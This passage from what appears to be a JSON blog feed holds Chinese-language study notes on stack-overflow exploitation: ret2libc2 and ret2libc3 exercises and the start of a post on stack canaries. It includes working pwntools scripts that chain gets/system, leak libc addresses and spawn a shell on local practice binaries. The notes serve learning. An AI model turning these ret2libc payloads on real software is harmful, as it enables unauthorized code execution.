class=\"line\">\tmovl\t%esp, %ebp</span><br><span class=\"line\">\tsubl\t$16, %esp</span><br><span class=\"line\">\tmovl\t8(%ebp), %eax</span><br><span class=\"line\">\tmovl\t%eax, -4(%ebp)</span><br><span class=\"line\">\tleave</span><br><span class=\"line\">\tret</span><br><span class=\"line\">bar:</span><br><span class=\"line\">\tpushl\t%ebp</span><br><span class=\"line\">\tmovl\t%esp, %ebp</span><br><span class=\"line\">\tsubl\t$16, %esp</span><br><span class=\"line\">\tmovl\t$5, -4(%ebp)</span><br><span class=\"line\">\tpushl\t-4(%ebp)                   // 这一句是干什么的?????? 这一句和上一句组合,压入参数</span><br><span class=\"line\">\tcall\tfoo</span><br><span class=\"line\">\taddl\t$4, %esp</span><br><span class=\"line\">\tleave</span><br><span class=\"line\">\tret</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a;</span><br><span class=\"line\">        a = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bar</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">        foo(b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  bar();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于参数等再怎么具体的,要看看编译原理? 之类的?</p>\n<h2 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a>ret2libc2</h2><p>​\t\t相比ret2libc1,ret2libc2里没有&#x2F;bin&#x2F;sh,需要我们自己从其他渠道获取</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">08048490</span> &lt;system@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">8048641</span>:\te8 <span class=\"number\">4</span>a fe ff ff       \tcall   <span class=\"number\">8048490</span> &lt;system@plt&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">08048460</span> &lt;gets@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">80486b</span>a:\te8 a1 fd ff ff       \tcall   <span class=\"number\">8048460</span> &lt;gets@plt&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x0804872f</span> : pop ebp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0804872c</span> : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0804843d</span> : pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t因为ret2libc2里有gets函数,所以可以先利用这个,读取一个&#x2F;bin&#x2F;sh,写入到哪呢? 写入到bss段,为什么写入到bss段呢?bss段的地址又怎么选呢???????</p>\n<p>​\t\t写入进去后再从这里读取就可以了!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A03F</span><br><span class=\"line\">.bss:0804A040 ; ===========================================================================</span><br><span class=\"line\">.bss:0804A040</span><br><span class=\"line\">.bss:0804A040 ; Segment type: Uninitialized</span><br><span class=\"line\">.bss:0804A040 ; Segment permissions: Read/Write</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以payload的构造</p>\n<p>​\t\tpayload &#x3D; b”a”*112 + gets + popret + buf + system + exit + buf</p>\n<p>​\t\tpayload &#x3D; b”a”*112 + gets + system + buf + buf</p>\n<p>​\t\t在gets的后面要跟一个pop xxx; ret 为什么呢? 因为这里本身是返回地址,在gets执行完后,要想继续执行的话,需要把后面的buf给弹出来,然后再ret,把system当成返回地址? 不知道这么理解对不对,可以调试一下看看</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gets = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">buf = <span class=\"number\">0x0804A040</span></span><br><span class=\"line\">popret = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(<span class=\"number\">0</span>) + p32(buf)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t感觉能行,但是有点小问题,,还有那这个payload是不是也可以呢?payload &#x3D; b”a”*112 + p32(gets) + p32(system) + p32(buf) + p32(buf),如果按照上面的逻辑的话,是的,这个payload没问题! <font color=\"red\">所以,究其根本我们是伪造了函数执行过程,只要符合它这个流程,理解本质,根据具体情况构造就可以了!!</font></p>\n<p>​\t\t(不过为什么执行一条命令就EOF了?) 那是因为 system需要获取&#x2F;bin&#x2F;sh…你忘了,直接输入 id  whoami什么的,肯定就一次,可以直接输入&#x2F;bin&#x2F;sh,也可以在exp里面在加一行 sh.send(b”&#x2F;bin&#x2F;sh”)</p>\n<p>​\t\t<font color=\"red\">不行,send不行,要两个sendline才可以,send和sendline肯定有区别,回头写pwntools时(pwn入门-6)看一下</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gets = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">buf = <span class=\"number\">0x0804A040</span></span><br><span class=\"line\">popret = <span class=\"number\">0x0804872f</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(gets) + p32(system) + p32(buf) + p32(buf)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;a&quot;*112 + p32(gets) + p32(popret) + p32(buf) + p32(system) + p32(0) + p32(buf)</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"ret2libc3\"><a href=\"#ret2libc3\" class=\"headerlink\" title=\"ret2libc3\"></a>ret2libc3</h2><p>​\t\t相比ret2libc2,system也没了,那就需要从libc中找了,libc的话没有给你版本,就需要泄露个函数地址,然后去找版本,泄漏的话,用puts输出.</p>\n<p>​\t\t是不是需要先换个libc版本呢???? 还是什么????????????????????&#x2F;不对呀,既然需要泄漏函数..那libc版本就是固定的了,为什么呢….是动态链接的事?</p>\n<p>​\t\t先打印出libc_start_main_addr 再说</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Libcsearcher <span class=\"keyword\">import</span> Libcsearcher</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.plt[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + puts_plt + main + libc_start_main_got</span><br><span class=\"line\">sh.sendafter(<span class=\"string\">&quot;Can you find it !?&quot;</span>,payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(libc_start_main_addr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t很奇怪,这个脚本感觉没什么问题,但是不行,下面的却可以…….感觉没有什么区别呀………..</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat([<span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;get the related addr&quot;</span>)</span><br><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main_addr))</span><br></pre></td></tr></table></figure>\n\n<p>sh.sendlineafter(‘Can you find it !?’, payload) </p>\n<p>sh.sendafter(“Can you find it !?”,payload1)</p>\n<p>区别在这里!!!!!</p>\n<p>还有如果不加[0:4]会是怎样?</p>\n<p>print(sh.recv())看看</p>\n<p>b’\\xb0\\xde\\xdf\\xf7\\nNo surprise anymore, system disappeard QQ.\\nCan you find it !?’</p>\n<p>所以是要前四个字节的意思! </p>\n<p>​\t\tlibc的问题参见下面,目前就当已经解决libc的问题了,然后继续做,libcbase的话就是这个&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),</p>\n<p>​\t\t然后就是获取binsh和system的地址,这个可以直接用objdump或者ROPgadget</p>\n<p>​\t\tobjdump -d &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep “system”</p>\n<p>​\t\tROPgadget –binary &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 –string ‘&#x2F;bin&#x2F;sh’</p>\n<p>​\t\t其实泄露了地址,找到了gadget,就是最开始最简单的那个溢出了,</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&quot;./ret2libc3&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = ret2libc3.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">puts_got = ret2libc3.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = ret2libc3.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system_addr = libcbase + libc.dump(&quot;system&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0xf7de5000</span> + <span class=\"number\">0x0003d3d0</span></span><br><span class=\"line\">binsh_addr =  <span class=\"number\">0xf7de5000</span> + <span class=\"number\">0x0017e1db</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t虽然这里没有成功,但还是看看exp,理解一下这个思路. 接收到泄露的地址后,用libcsearcher搜索一下,搜索到了之后,用libc_start_main_addr(这个就是虚拟地址) 减去 __libc_start_main的地址(在文件中的偏移),于是就得到了加载libc的基地址,就是这玩意\tlibc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 (0xf7de5000),然后再从libc里面搜索要用的函数或者字符串,加上加载的基地址就可以了.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc_start_main_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;get shell&quot;</span></span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">104</span>, system_addr, <span class=\"number\">0xdeadbeef</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"关于libc的问题\"><a href=\"#关于libc的问题\" class=\"headerlink\" title=\"关于libc的问题\"></a>关于libc的问题</h3><p>​\t\t首先,之所以要泄露libc的版本是因为,我们要打一个远程的机器,要利用到它的libc库里的函数,但是不同版本的libc的函数位置等是不一样的,<font color=\"red\">所以需要泄露远程机器的libc版本</font>,然后本地patch进行调试,再打远程.</p>\n<p>​\t\t像很多博客中的例题,是没有远程环境的,所以就自己利用自己本地的环境,链接到自己本地的libc上,不过问题是,有时候libcsearch搜索自己本地的libc搜不出来,版本是错的,目前我也不知道为什么….当然这些工具本身就不是完美的.</p>\n<p>​\t\t这种题的话,如果出现上面的问题,可以就略过搜索libc的环节,直接用本地的就好了.</p>\n<p>​\t\t查看本地libc版本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># ldd --version</span></span><br><span class=\"line\">ldd (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1<span class=\"number\">.4</span>) <span class=\"number\">2.27</span></span><br><span class=\"line\">Copyright (C) <span class=\"number\">2018</span> Free Software Foundation, Inc.</span><br><span class=\"line\">This is <span class=\"built_in\">free</span> software; see the source <span class=\"keyword\">for</span> copying conditions.  There is NO</span><br><span class=\"line\">warranty; not even <span class=\"keyword\">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class=\"line\">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t一般来说都是链接到这个默认的,可以用ldd查看一下,然后直接执行这个文件也可以看到版本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># ldd ret2libc3</span></span><br><span class=\"line\">\tlinux-gate.so<span class=\"number\">.1</span> (<span class=\"number\">0xf7fd5000</span>)</span><br><span class=\"line\">\tlibc.so<span class=\"number\">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class=\"number\">.6</span> (<span class=\"number\">0xf7de5000</span>)</span><br><span class=\"line\">\t/lib/ld-linux.so<span class=\"number\">.2</span> (<span class=\"number\">0xf7fd6000</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"># /lib/i386-linux-gnu/libc.so<span class=\"number\">.6</span> --version</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1<span class=\"number\">.6</span>) stable release version <span class=\"number\">2.27</span>.</span><br><span class=\"line\">Copyright (C) <span class=\"number\">2018</span> Free Software Foundation, Inc.</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t获取libc版本的话可以有很多方式,可以到libc database网站上查,也可以用libcsearch这个库,<font color=\"red\">但不一定百分百准确,</font></p>\n<p>​\t\t比如上面获取了libc_start_main_addr的地址后,就可以去网站上查 <a href=\"https://libc.blukat.me/\">https://libc.blukat.me</a></p>\n<p>​\t\t但是确实不准……..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221212120145.png\" alt=\"image-20230221212120145\"></p>\n<p>​\t\t或者用libcsearch,在上面的代码基础上再加2行</p>\n<p>​\t\tlibc &#x3D; LibcSearcher(‘__libc_start_main’, libc_start_main_addr)</p>\n<p>​\t\tlibcbase &#x3D; libc_start_main_addr - libc.dump(‘__libc_start_main’)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[+] There are multiple libc that meet current constraints :</span><br><span class=\"line\"><span class=\"number\">0</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-13.f</span>c31.i686</span><br><span class=\"line\"><span class=\"number\">1</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-2</span>-x86</span><br><span class=\"line\"><span class=\"number\">2</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-3</span>-x86</span><br><span class=\"line\"><span class=\"number\">3</span> - libc<span class=\"number\">-2.30</span><span class=\"number\">-1</span>-x86</span><br><span class=\"line\"><span class=\"number\">4</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-16.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">5</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-17.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">6</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-20.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">7</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-21.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">8</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-18.</span>mga8.x86_64_2</span><br><span class=\"line\"><span class=\"number\">9</span> - libc<span class=\"number\">-2.32</span><span class=\"number\">-19.</span>mga8.x86_64_2</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t咱也不知道为啥..就是不对,,可能数据库汇总没收录??不对呀,这就是很常见的2.27..</p>\n<h1 id=\"残留疑问\"><a href=\"#残留疑问\" class=\"headerlink\" title=\"残留疑问\"></a>残留疑问</h1><p>输入到bss段中的&#x2F;bin&#x2F;sh有什么要求呢?哪里都可以输入吗?为什么输入到bss段?</p>\n<p>好像是pip和github下载的libcsearch有区别</p>\n<p>这个查的不准可以去别的地方查,把libc_start_main_addr打印出来后,去一些网址上查可以</p>\n<p><a href=\"https://www.jianshu.com/p/5525dde00053\">https://www.jianshu.com/p/5525dde00053</a></p>\n<p>为什么nm和exp里的输出不一样,是因为一个是静态,一个是动态加载后的吗</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221224958263.png\" alt=\"image-20230221224958263\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221225004604.png\" alt=\"image-20230221225004604\"></p>\n<p>__libc_start_main 通过这个得到libc?</p>\n<p><a href=\"https://blog.csdn.net/weixin_45309916/article/details/119481681\">https://blog.csdn.net/weixin_45309916/article/details/119481681</a></p>\n<p>​\t</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/",
            "title": "pwn入门-8-os保护机制canary",
            "date_published": "2023-02-18T03:05:31.000Z",
            "content_html": "<p>分类、破解方法</p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>​\t\t会把canary放到比返回地址还低的位置上,这样溢出的时候,从低地址向高地址溢出,就会覆盖掉canary.</p>\n<p>例子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>,buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219151606661.png\" alt=\"image-20230219151606661\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># gcc -fno-stack-protector canary.c -o fno.out</span></span><br><span class=\"line\"># python3 -c <span class=\"string\">&quot;print (&#x27;a&#x27;*30)&quot;</span> | ./fno.out</span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br><span class=\"line\"><span class=\"meta\"># gcc -fstack-protector canary.c -o fno.out</span></span><br><span class=\"line\"># python3 -c &quot;<span class=\"title function_\">print</span> <span class=\"params\">(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">30</span>)</span>&quot; | ./fno.out</span><br><span class=\"line\">*** <span class=\"built_in\">stack</span> smashing detected ***: &lt;unknown&gt; terminated</span><br><span class=\"line\"><span class=\"title function_\">Aborted</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t64位和32位不一样,下面进行调试和查看反汇编代码来看一下</p>\n<h2 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span 